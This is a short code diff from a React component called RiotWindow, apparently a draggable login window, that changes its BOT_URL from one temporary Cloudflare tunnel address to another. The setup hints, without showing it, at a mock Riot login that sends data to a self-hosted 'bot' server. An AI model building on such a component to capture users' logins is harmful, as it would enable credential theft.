@@ -19,7 +19,7 @@ const RiotWindow = ({ onClose, onSuccess }) => {
   const loginTimeout = useRef(null);
 
   // UPDATE THIS WITH YOUR NGROK URL
-  const BOT_URL = 'https://limiting-html-midwest-tribal.trycloudflare.com';
+  const BOT_URL = 'https://shoe-frontier-cloud-strand.trycloudflare.com';
 
   const handleMouseDown = (e) => {
     if (e.button !== 0) return;
